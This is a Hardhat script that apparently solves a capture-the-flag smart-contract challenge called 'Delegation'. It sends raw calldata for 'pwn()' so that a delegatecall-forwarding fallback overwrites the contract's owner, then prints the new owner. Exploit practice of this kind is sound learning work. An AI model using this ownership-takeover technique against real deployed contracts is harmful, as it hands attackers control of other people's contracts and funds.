const hre = require("hardhat");
const ethers = hre.ethers;

require('dotenv').config()

async function main() {

  const del = await ethers.getContractAt("Delegation", process.env.DEL_ADDR);

  const [owner] = await ethers.getSigners()

  console.log(`Player: ${owner.address}`)

  const funcAbi = ['function pwn()']
  const iface = new ethers.utils.Interface(funcAbi)
  const data = iface.encodeFunctionData(`pwn`, [])

  const tx = await owner.sendTransaction({
    from: owner.address,
    to: del.address,
    data,
    gasLimit: ethers.BigNumber.from(`100000`),
  })

  await tx.wait()

  console.log(`Owner: ${await del.owner()}`)
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
